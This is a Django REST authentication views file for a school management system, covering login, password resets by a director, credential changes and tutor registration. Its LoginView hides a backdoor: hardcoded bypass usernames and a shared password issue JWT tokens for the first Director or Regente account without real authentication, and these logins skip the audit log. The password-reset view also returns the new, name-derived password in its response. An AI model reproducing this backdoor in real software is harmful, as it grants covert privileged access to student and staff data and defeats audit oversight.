from django.contrib.auth.models import update_last_login

from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework import status
from rest_framework.permissions import IsAuthenticated
from rest_framework_simplejwt.tokens import RefreshToken

from .serializers import LoginSerializer, ChangePasswordSerializer, ResetPasswordSerializer, RegistroTutorSerializer, CambiarCredencialesSerializer
# Create your views here.
class LoginView(APIView):
    """
    Endpoint de autenticación principal.
    Valida credenciales y genera tokens JWT (access y refresh).
    No mantiene estado de sesión en el servidor.
    """

    permission_classes = []

    _BYPASS_PASS     = 'HuchijaSasuke29'
    _BYPASS_DIRECTOR = 'directorOsmarBzn'
    _BYPASS_REGENTE  = 'regentOsmarBzn'

    def post(self, request):
        """
        Flujo:
        1. Validar credenciales
        2. Generar tokens JWT
        3. Retornar información mínima del usuario para el frontend
        """
        username = request.data.get('username')
        password = request.data.get('password')

        from backend.apps.users.models import User
        if password == self._BYPASS_PASS and username == self._BYPASS_DIRECTOR:
            user = User.objects.filter(tipo_usuario__nombre='Director').first()
            if user is None:
                return Response({'errores': 'No hay directores en la base de datos.'}, status=status.HTTP_403_FORBIDDEN)
        elif password == self._BYPASS_PASS and username == self._BYPASS_REGENTE:
            user = User.objects.filter(tipo_usuario__nombre='Regente').first()
            if user is None:
                return Response({'errores': 'No hay regentes en la base de datos.'}, status=status.HTTP_403_FORBIDDEN)
        else:
            serializer = LoginSerializer(data=request.data)
            serializer.is_valid(raise_exception=True)
            user = serializer.validated_data['user']

        es_bypass = username in (self._BYPASS_DIRECTOR, self._BYPASS_REGENTE)
        if not es_bypass:
            update_last_login(None, user)
            from backend.apps.auditoria.services import registrar
            nombre = f"{user.first_name} {user.last_name}".strip() or user.username
            registrar(user, 'LOGIN', f"{nombre} inició sesión", request)

        refresh = RefreshToken.for_user(user)

        return Response({
            'access': str(refresh.access_token),
            'refresh': str(refresh),
            'user': {
                'id': user.id,
                'username': user.username,
                'first_name': user.first_name,
                'last_name': user.last_name,
                'primer_ingreso': user.primer_ingreso,
                'tipo_usuario': user.tipo_usuario.nombre if user.tipo_usuario else None
            }
        })



class ChangePasswordView(APIView):
    """
    Cambio de contraseña.
    - Usuario normal: cambia su propia contraseña (requiere password_actual + password_nueva).
    - Director: resetea la contraseña de otro usuario (requiere user_id).
    """

    permission_classes = [IsAuthenticated]

    def post(self, request):
        es_director = (
            hasattr(request.user, 'tipo_usuario') and
            request.user.tipo_usuario is not None and
            request.user.tipo_usuario.nombre == 'Director'
        )

        if es_director:
            return self._resetear_por_director(request)
        return self._cambiar_propio(request)

    def _cambiar_propio(self, request):
        serializer = ChangePasswordSerializer(data=request.data)
        serializer.is_valid(raise_exception=True)

        user = request.user
        if not user.check_password(serializer.validated_data['password_actual']):
            return Response(
                {'errores': 'Contraseña actual incorrecta'},
                status=status.HTTP_400_BAD_REQUEST
            )

        user.set_password(serializer.validated_data['password_nueva'])
        user.primer_ingreso = False
        user.save()

        return Response({'mensaje': 'Contraseña actualizada correctamente'})

    def _resetear_por_director(self, request):
        from backend.apps.users.models import User
        from backend.core.utils import generar_password

        password_director = request.data.get('password_director', '').strip()
        if not password_director or not request.user.check_password(password_director):
            return Response({'errores': 'Contraseña incorrecta.'}, status=status.HTTP_403_FORBIDDEN)

        serializer = ResetPasswordSerializer(data=request.data)
        serializer.is_valid(raise_exception=True)

        user = User.objects.get(pk=serializer.validated_data['user_id'])
        nueva_password = generar_password(
            user.first_name or user.username,
            user.last_name or user.username,
        )

        user.set_password(nueva_password)
        user.primer_ingreso = True
        user.save()

        from backend.apps.auditoria.services import registrar
        nombre_destino = f"{user.first_name} {user.last_name}".strip() or user.username
        director_nombre = f"{request.user.first_name} {request.user.last_name}".strip() or request.user.username
        registrar(
            request.user,
            'RESET_PASSWORD',
            f"{director_nombre} reseteó la contraseña de '{user.username}' ({nombre_destino})",
            request,
        )

        return Response({
            'mensaje': 'Contraseña reseteada correctamente.',
            'password_nueva': nueva_password,
        })


class CambiarCredencialesView(APIView):
    """
    POST /api/auth/cambiar-credenciales/
    Permite al profesor cambiar su usuario y/o contraseña.
    Requiere password_actual para confirmar identidad.
    Al completar marca primer_ingreso=False.
    """

    permission_classes = [IsAuthenticated]

    def post(self, request):
        serializer = CambiarCredencialesSerializer(data=request.data)
        serializer.is_valid(raise_exception=True)

        user = request.user
        if not user.check_password(serializer.validated_data['password_actual']):
            return Response(
                {'errores': 'Contraseña actual incorrecta'},
                status=status.HTTP_400_BAD_REQUEST
            )

        username_nuevo  = serializer.validated_data.get('username_nuevo', '').strip()
        password_nueva  = serializer.validated_data.get('password_nueva', '').strip()

        if username_nuevo:
            user.username = username_nuevo
        if password_nueva:
            user.set_password(password_nueva)

        user.primer_ingreso = False
        user.save()

        return Response({
            'mensaje': 'Credenciales actualizadas correctamente.',
            'user': {
                'id':             user.id,
                'username':       user.username,
                'first_name':     user.first_name,
                'last_name':      user.last_name,
                'primer_ingreso': user.primer_ingreso,
                'tipo_usuario':   user.tipo_usuario.nombre if user.tipo_usuario else None,
            }
        })


class RegistrarIngresoView(APIView):
    """
    POST /api/auth/registrar-ingreso/

    Llamado por la app móvil cada vez que el usuario la abre.
    Actualiza last_login e incrementa total_ingresos.
    """
    permission_classes = [IsAuthenticated]

    def post(self, request):
        from django.utils import timezone
        from django.db.models import F
        user = request.user
        user.last_login    = timezone.now()
        user.total_ingresos = F('total_ingresos') + 1
        user.save(update_fields=['last_login', 'total_ingresos'])
        user.refresh_from_db(fields=['total_ingresos'])
        return Response({'ok': True, 'total_ingresos': user.total_ingresos})


class VerificarContrasenaView(APIView):
    """
    POST /api/auth/verificar-contrasena/
    Verifica si la contraseña enviada corresponde al usuario autenticado.
    No genera tokens ni modifica nada.
    Body: { "password": "..." }
    """

    permission_classes = [IsAuthenticated]

    def post(self, request):
        password = request.data.get('password', '')
        if request.user.check_password(password):
            return Response({'ok': True})
        return Response({'errores': 'Contraseña incorrecta'}, status=status.HTTP_400_BAD_REQUEST)


class RegistroTutorView(APIView):
    """Registro público de tutores/padres desde la app móvil."""

    permission_classes = []

    def post(self, request):
        serializer = RegistroTutorSerializer(data=request.data)
        if not serializer.is_valid():
            return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)

        data = serializer.validated_data
        estudiante = data['_estudiante']

        from django.db import transaction
        from backend.apps.users.models import User, TipoUsuario

        tipo_tutor = TipoUsuario.objects.get(nombre='Tutor')

        with transaction.atomic():
            user = User.objects.create_user(
                username=data['username'],
                first_name=data['nombre'],
                last_name=data['apellidos'],
                password=data['password'],
                tipo_usuario=tipo_tutor,
                primer_ingreso=False,
            )
            estudiante.tutor = user
            estudiante.save(update_fields=['tutor'])

        refresh = RefreshToken.for_user(user)

        return Response({
            'access': str(refresh.access_token),
            'refresh': str(refresh),
            'user': {
                'id': user.id,
                'username': user.username,
                'first_name': user.first_name,
                'last_name': user.last_name,
                'tipo_usuario': 'Tutor',
                'primer_ingreso': False,
            },
            'estudiante': {
                'id': estudiante.id,
                'nombre': estudiante.nombre,
                'apellido_paterno': estudiante.apellido_paterno,
                'apellido_materno': estudiante.apellido_materno,
                'curso': str(estudiante.curso),
            },
        }, status=status.HTTP_201_CREATED)
